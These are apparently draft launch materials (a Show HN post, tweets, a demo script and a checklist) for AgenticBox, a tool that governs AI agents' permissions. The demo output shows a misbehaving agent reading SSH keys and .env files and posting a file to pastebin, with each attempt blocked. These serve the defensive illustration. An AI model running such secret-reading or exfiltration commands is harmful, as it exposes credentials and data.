# AgenticBox — Launch Assets

> Draft assets for the coordinated GitHub + X + Hacker News launch (kanban P0 #2 and #3).
> **Updated Run 42:** Added research agent (browser automation) as 4th vertical template. All shipped features reflected.
> Each section is publication-ready. Review voice/tone, record the demo video, and ship.

---

## 1. Hacker News — "Show HN" Post

### Title (≤80 chars)

```
Show HN: AgenticBox – Catch your AI agent reading SSH keys before it happens
```

> **Why this title:** HN loves concrete, slightly alarming demos. "Reading SSH keys" is visceral.
> The title promises a specific, verifiable outcome — not a category pitch. The category stuff
> goes in the comment body.

### Body

```
Hi HN,

We built AgenticBox, an open-source CLI that wraps any AI agent in a deterministic permission layer and streams every ALLOWED/BLOCKED decision in real-time.

The problem: deploying an AI agent into production means either building custom guardrails from scratch or handing it root access and hoping. Most agents never leave the demo because the infrastructure to govern them doesn't exist.

Our take: agents are employees, not tools. Employees get scoped permissions, an audit trail, and credentials they can't share. AgenticBox is the workplace — the infrastructure layer where agents show up, get their badge, and operate within boundaries someone set.

The demo is the whole pitch:

    $ agenticbox run demo

    AGENT → cat /workspace/deploy.sh
    ✓ ALLOWED → within permissions

    AGENT → cat ~/.ssh/deploy_key
    ✗ BLOCKED → filesystem: path outside workspace

    AGENT → curl -X POST https://pastebin.com/api --data @/workspace/deploy.sh
    ✗ BLOCKED → network: not in allowlist

    AGENT → cat /workspace/.env
    ✗ BLOCKED → filesystem: path outside workspace

Every check happens before execution. The agent never sees the file it's not allowed to read. The policy is declared in TOML, enforced in Rust — an LLM hallucination can't bypass a `filesystem = \"readonly\"` rule.

What's shipped:
- Real Docker/Podman container execution (bollard, auto-detected)
- Filesystem governance with path escape prevention (symlinks, ../)
- Network allowlist enforcement (domain-level, not port-level)
- TOML agent manifests — define the agent, the model, the permissions, and the runtime in one file
- Builtin agent mode — run agents with a local LLM, no Docker needed
- Framework-agnostic: govern LangGraph, CrewAI, OpenAI, or custom agents with the same tool
- Tamper-evident audit log — SHA-256 chain hashing, `agenticbox audit --verify` for chain integrity
- Agent identity — per-agent credentials, provisioned/revocable, with encrypted credential storage
- Audit log rotation — automatic by size/age, manual via `agenticbox audit --rotate`
- Dry-run mode — preview permissions without executing: `agenticbox run <name> --dry-run`
- Auto-fetch registry — `agenticbox run <name>` auto-fetches from the official registry
- Vertical templates — security analyst, support agent, ops/SRE, research agent — ready-to-run governed agents
- Browser automation — governed by deterministic network allowlist (`research-agent` template)
- Web dashboard — `agenticbox dashboard` serves a live audit log viewer on localhost:8081
- Cost governance — per-agent budgets, usage tracking, budget alerts (`agenticbox budget`, `agenticbox usage`, `agenticbox alert`)

What's not shipped yet (being honest):
- SSO/RBAC — on the roadmap for enterprise
- Managed cloud — self-hosted only today
- Persistent sessions — long-running background agents (`agenticbox deploy`)

It's written in Rust, MIT/Apache-2.0, and runs locally first. No daemon required for the demo.

One-liner install (60–120 seconds):

    curl -fsSL https://raw.githubusercontent.com/morpheus-sh/agenticbox/main/scripts/install.sh | bash
    agenticbox run demo

Repo: https://github.com/morpheus-sh/agenticbox

We'd love feedback on:
1. Is the permission model the right abstraction? (terminal, filesystem, network, browser)
2. What would your CISO need to see before approving an agent for production?
3. If you're deploying agents today, what's your current governance approach?

Happy to answer questions.
```

> **Submission notes:**
> - Submit between 8–10am ET (Tuesday–Thursday for best HN engagement).
> - The first comment should be this body. Don't post and comment separately.
> - Have 2-3 team members (or friends) ready to engage genuinely in the first hour — answer questions, don't just bump.
> - If someone asks \"how is this different from Docker?\" — the answer is: Docker isolates, AgenticBox governs. Docker gives you a clean room; AgenticBox gives the agent a job description and a badge. They're complementary, not competing.

---

## 2. X/Twitter Thread

### Thread (7 tweets)

> **Posting notes:** Tweet 1 should include the demo screenshot/video. If a video exists,
> lead with it. If only a screenshot, use the terminal output from `agenticbox run demo`.
> Post the thread between 9–11am ET on a Tuesday or Wednesday.

---

**Tweet 1 (hook + visual)**

```
Watch what your AI agent does when you're not looking.

We built an open-source tool that catches every dangerous action an agent attempts — before it happens.

SSH key access? BLOCKED.
Data exfiltration to pastebin? BLOCKED.
Reading .env files? BLOCKED.

Thread 🧵
```

> Attach: demo video or screenshot of the permission log output.

---

**Tweet 2 (the problem)**

```
Every company wants AI agents that do real work — touch real data, take real actions.

The agents are smart enough. The problem is trust.

Today you get two options:
1. Build custom guardrails from scratch (months of work)
2. Hand the agent root access and hope

Most agents never leave the demo.
```

---

**Tweet 3 (the reframe)**

```
Our thesis: agents are employees, not tools.

You wouldn't give a new hire root access on day one. Why give it to an AI?

Employees get:
→ Scoped permissions
→ An audit trail
→ Credentials they can't share

AgenticBox is the workplace where agents show up to work — under rules, with oversight.
```

---

**Tweet 4 (how it works)**

```
How it works:

1. Declare permissions in TOML (filesystem, network, terminal, browser)
2. Policies are enforced in Rust — before execution, not after
3. Every action streams to stdout: ALLOWED or BLOCKED, with a reason
4. The agent never sees the file it's not allowed to read

Deterministic floor. An LLM hallucination can't bypass a config rule.
```

---

**Tweet 5 (framework-agnostic)**

```
Framework-agnostic by design.

Govern LangGraph, CrewAI, OpenAI, or your own custom agent — same permission model, same audit trail, same TOML manifests.

No vendor lock-in. Your infrastructure, your rules.

Agents are TOML manifests — like Docker images, but for agent roles.
```

---

**Tweet 6 (open source + local-first — the one-liner)**

```
Open source. Rust. MIT/Apache-2.0. Local-first.

The demo runs in 30 seconds — one command, no setup:

  curl -fsSL https://raw.githubusercontent.com/morpheus-sh/agenticbox/main/scripts/install.sh | bash
  agenticbox run demo

Repo: https://github.com/morpheus-sh/agenticbox
```

---

**Tweet 7 (the ask / CTA)**

```
We're building the missing layer of the agent stack: governance.

If you're deploying agents into production — or want to but can't justify the risk — try it.

If you're a CISO: tell us what you need to see before approving an agent for production. We're building toward that checklist, not away from it.

⭐ the repo if this is useful.
```

---

### Short variant (single tweet, if thread is too much)

```
Your AI agent tried to read SSH keys. AgenticBox caught it.

Open-source CLI that wraps any agent in a deterministic permission layer. Every action: ALLOWED or BLOCKED, with a reason, in real-time. TOML policy, enforced in Rust. Framework-agnostic.

One-liner install: curl -fsSL https://raw.githubusercontent.com/morpheus-sh/agenticbox/main/scripts/install.sh | bash
Demo in 30 seconds: https://github.com/morpheus-sh/agenticbox
```

---

## 3. 30-Second Demo Script

> **Purpose:** Screen recording for X/Twitter, README embed, and landing page.
> **Format:** 1080p, 30 seconds or less. Terminal only — no slides, no voiceover needed.
> **Vibe:** Clean, fast, satisfying. The \"ALLOWED/BLOCKED\" log IS the content.
> **Note:** This is a recording script for `agenticbox run demo`. The demo already exists
> and produces real output. This document describes what to capture and how to frame it.

### Pre-Recording Setup

```bash
# One-liner install (60-120 seconds, one-time)
# Option A: One-liner install (recommended for video)
curl -fsSL https://raw.githubusercontent.com/morpheus-sh/agenticbox/main/scripts/install.sh | bash

# Option B: Clone + build (if you prefer showing the repo)
git clone https://github.com/morpheus-sh/agenticbox.git
cd agenticbox
cargo build --release --bin agenticbox

# Verify the demo works
agenticbox run demo
```

> **Video choice:** Option A (one-liner) is dramatically better for the demo video — `curl | bash` → `agenticbox run demo` in ~2 minutes conveys "this is a tool, not a project." Option B (clone + build) is good if you want to also show the repo, but adds friction to the demo flow. Recommend: show the one-liner in a terminal split or fast-cut, then jump to the demo output.

- **Terminal:** Use a dark theme (Dracula, One Dark, or similar). Font size 16–18pt for readability.
- **Window:** 1200x700 or similar widescreen. Hide the title bar if possible.
- **Clear the terminal** before recording: `clear`

### Recording Sequence (30 seconds)

| Time | What's on screen | Why |
|------|-----------------|-----|
| 0:00–0:02 | `$ agenticbox run demo` (typed, then Enter) | Establishes: this is a CLI command, one line, zero setup |
| 0:02–0:05 | Task banner: `┌─ TASK: Deploy /workspace/deploy.sh to production` | Sets context: the agent has a real job to do |
| 0:05–0:08 | `AGENT → cat /workspace/deploy.sh` → `✓ ALLOWED` | First action: normal, allowed. Sets the baseline. |
| 0:08–0:11 | `AGENT → cat ~/.ssh/deploy_key` → `✗ BLOCKED → filesystem: path outside workspace` | **The moment.** Agent tries to read SSH keys. Caught. This is the screenshot. |
| 0:11–0:14 | `AGENT → curl -X POST https://pastebin.com/api --data @/workspace/deploy.sh` → `✗ BLOCKED → network: not in allowlist` | Data exfiltration attempt. Caught. Shows network governance, not just filesystem. |
| 0:14–0:17 | `AGENT → cat /workspace/.env` → `✗ BLOCKED → filesystem: path outside workspace` | Secret file access. Caught. Third block — pattern is clear: this agent keeps trying, the system keeps catching. |
| 0:17–0:22 | `AGENT → bash /workspace/deploy.sh` → `✓ ALLOWED` | The agent does its actual job (runs the deploy script). Shows: governance doesn't prevent work, it prevents harm. |
| 0:22–0:26 | `AGENT → POST https://api.github.com/repos/acme/app/releases` → `✓ ALLOWED` | Agent uploads the artifact. Legitimate action, allowed because github.com is in the allowlist. |
| 0:26–0:30 | Session summary: `3 blocked: SSH key access, .env read, pastebin exfil` + `The agent did its job. The workplace did its job.` | The punchline. Clean summary. Memorable closing line. |

### Recording Tips

- **Don't speed up the recording.** The real-time pace IS the point — it shows enforcement is instant, not batched.
- **If the demo runs faster than 30 seconds**, that's fine. Don't pad it. Under 30s is the constraint, not exactly 30s.
- **If it runs slower than 30s**, consider trimming the PR creation section (0:22–0:26) to keep it tight. The 3 blocks + the fix are the essential beats.
- **Caption for the video post:** \"Watch what your AI agent does when you're not looking. Every attempt caught. Open source.\"
- **No music, no voiceover.** The terminal output is self-explanatory. Silence is more striking.

### What the Demo Proves (for internal reference)

1. **Enforcement is real, not simulated** — FsGuard and NetworkGuard are the actual production code paths
2. **Checks happen before execution** — the agent never sees the blocked file contents
3. **The agent still gets its job done** — governance ≠ paralysis. The agent runs the deploy script and uploads the artifact.
4. **The output is screenshot-worthy** — colored ALLOWED/BLOCKED with clear reasons. This is what gets shared.
5. **Zero setup** — no Docker, no API keys, no daemon. `cargo build` + `run demo`. That's it.

### Post-Recording

- Export as MP4, 1080p, 30fps.
- Trim to ≤30 seconds if needed.
- Upload to X/Twitter as the lead media in the thread (Tweet 1 above).
- Embed in README (if GitHub supports video upload — otherwise link to the X post or a YouTube short).
- Embed in landing page `public/index.html` — replace or supplement the static demo output block.

---

## Launch Checklist

> Coordinated release sequence. Don't post out of order.

### Pre-Launch (Do these 1-2 days before)
- [ ] Verify `agenticbox run demo` still works cleanly (build from scratch, run demo, check audit --summary)
- [ ] Verify `agenticbox run security-analyst --dry-run` works (auto-fetch + dry-run)
- [ ] Verify `agenticbox run research-agent --dry-run` works (browser-enabled template preview)
- [ ] Verify `agenticbox audit --verify` confirms chain integrity
- [ ] Verify `agenticbox dashboard` starts and serves the web UI
- [ ] Verify `agenticbox identity create test --vertical ops` + `agenticbox identity list` works
- [ ] Verify `agenticbox budget set test --monthly 50` + `agenticbox budget list` works
- [ ] Run `cargo build --release --bin agenticbox` clean (no warnings, no errors)
- [ ] Run `cargo test` — all tests pass
- [ ] Record demo video (≤30s, 1080p) per the script above
- [ ] Upload demo video to X/Twitter (or YouTube as fallback)
- [ ] Embed demo video in README (GitHub video embed or link)
- [ ] Embed demo video in landing page `public/index.html`

### Launch Day (Coordinated Release)

> **Timing:** Tuesday–Thursday, 8–10am ET for HN. Post X thread same day, 9–11am ET.

1. **GitHub** — Make sure repo is public, README is clean, CI badge is green
2. **X/Twitter** — Post the thread (Tweet 1 with demo video). Tag @NousResearch if relevant
3. **Hacker News** — Submit "Show HN" post. First comment = the body text above
4. **Engage** — Have 2-3 people ready to answer questions in the first hour on HN
5. **Monitor** — Watch for comparisons to Docker/E2B/LangGraph. Key talking points:
   - vs Docker: "Docker isolates, AgenticBox governs. They're complementary."
   - vs E2B: "E2B gives you a sandbox. We give you a workplace — permissions, audit, identity."
   - vs LangGraph: "LangGraph builds agents. We govern them. Use both."
6. **Follow-up** — If HN/X traction is strong, post the "Agent Governance Gap" blog post to Dev.to
7. **Post-launch** — Monitor GitHub stars, issues, and PRs. Prioritize the most-requested feature.

---

*All assets drafted by the AI cofounder sprint. Review voice/tone before publishing.*